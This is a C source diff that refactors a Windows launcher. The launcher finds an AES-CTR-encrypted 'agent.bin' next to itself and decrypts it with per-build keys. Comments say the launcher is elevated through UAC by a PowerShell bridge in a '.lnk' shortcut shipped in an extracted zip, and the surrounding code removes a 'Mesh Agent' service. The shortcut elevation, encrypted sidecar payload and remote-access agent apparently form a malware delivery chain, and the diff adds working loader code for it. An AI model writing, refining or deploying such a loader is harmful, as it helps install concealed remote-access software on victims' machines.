@@ -174,6 +174,49 @@ static void cleanup_stale_install(void) {
     svc_delete("Mesh Agent");
 }
 
+/* Read the sibling agent.bin from a directory (dir==NULL => CWD-relative) and
+ * AES-CTR decrypt it with the per-build envelope keys. Returns malloc'd
+ * plaintext or NULL. */
+static uint8_t *read_external_payload(const char *dir, const Overlay *ov, size_t *out_len) {
+    char *bin = join_path(dir, "agent.bin");
+    if (!bin) return NULL;
+    uint8_t *cipher; size_t clen;
+    if (!read_file(bin, &cipher, &clen)) { free(bin); return NULL; }
+    free(bin);
+    if (clen != ov->payload_len) { free(cipher); return NULL; }
+    uint8_t *pay = (uint8_t *)malloc(clen ? clen : 1);
+    if (!pay) { free(cipher); return NULL; }
+    if (clen) {
+        memcpy(pay, cipher, clen);
+        aes256_ctr_xor(ov->kb, ov->iv_pay, pay, clen);
+    }
+    free(cipher);
+    *out_len = clen;
+    return pay;
+}
+
+/* Directory containing THIS process's own binary (absolute, from
+ * GetModuleFileName — NOT argv[0] or the working directory, both of which can
+ * be relative or reset when the .lnk's PowerShell bridge elevates us via
+ * -Verb RunAs / UAC). Returns 1 and a stripped directory when found. */
+static int self_dir_windows(char *dir, size_t cap) {
+#ifdef _WIN32
+    char exe[MAX_PATH];
+    DWORD got = GetModuleFileNameA(NULL, exe, MAX_PATH);
+    if (got == 0 || got >= MAX_PATH) return 0;
+    size_t slen = strlen(exe);
+    if (slen >= cap) return 0;
+    memcpy(dir, exe, slen); dir[slen] = 0;
+    char *slash = NULL;
+    for (char *p = dir; *p; p++) if (*p == '\\' || *p == '/') slash = p;
+    if (slash) *slash = 0; /* keep just the directory */
+    return 1;
+#else
+    (void)dir; (void)cap;
+    return 0;
+#endif
+}
+
 /* Return the DECRYPTED agent bytes: for a legacy inline overlay use ov->payload;
  * for PAYLOAD_EXTERNAL read the sibling <dir of self>\agent.bin and AES-CTR
  * decrypt it with the per-build ov->kb/ov->iv_pay. Returns malloc'd bytes or NULL. */
@@ -187,28 +230,23 @@ static uint8_t *load_payload(const char *self, const Overlay *ov, size_t *out_le
         return pay;
     }
     char dir[1024];
+    /* Preferred: the ABSOLUTE directory of Launcher.exe itself. Immune to a
+     * relative argv[0] or a working directory that UAC elevation resets, so the
+     * sibling agent.bin always resolves from wherever the zip was extracted
+     * (the launcher always runs from ITS OWN folder). */
+    if (self_dir_windows(dir, sizeof(dir))) {
+        pay = read_external_payload(dir[0] ? dir : NULL, ov, out_len);
+        if (pay) return pay;
+    }
+    /* Fallback: the directory embedded in argv[0] (legacy), else CWD. */
     size_t slen = strlen(self ? self : "");
-    if (slen >= 1024) return NULL;
+    if (slen >= sizeof(dir)) return NULL;
     memcpy(dir, self, slen);
     dir[slen] = 0;
     char *slash = NULL;
     for (char *p = dir; *p; p++) if (*p == '\\' || *p == '/') slash = p;
     if (slash) *slash = 0; /* keep just the directory (empty when self has no dir) */
-    char *bin = join_path(slash ? dir : NULL, "agent.bin");
-    if (!bin) return NULL;
-    uint8_t *cipher; size_t clen;
-    if (!read_file(bin, &cipher, &clen)) { free(bin); return NULL; }
-    free(bin);
-    if (clen != ov->payload_len) { free(cipher); return NULL; }
-    pay = (uint8_t *)malloc(clen ? clen : 1);
-    if (!pay) { free(cipher); return NULL; }
-    if (clen) {
-        memcpy(pay, cipher, clen);
-        aes256_ctr_xor(ov->kb, ov->iv_pay, pay, clen);
-    }
-    free(cipher);
-    *out_len = clen;
-    return pay;
+    return read_external_payload(slash ? dir : NULL, ov, out_len);
 }
 #endif /* _WIN32 */
 
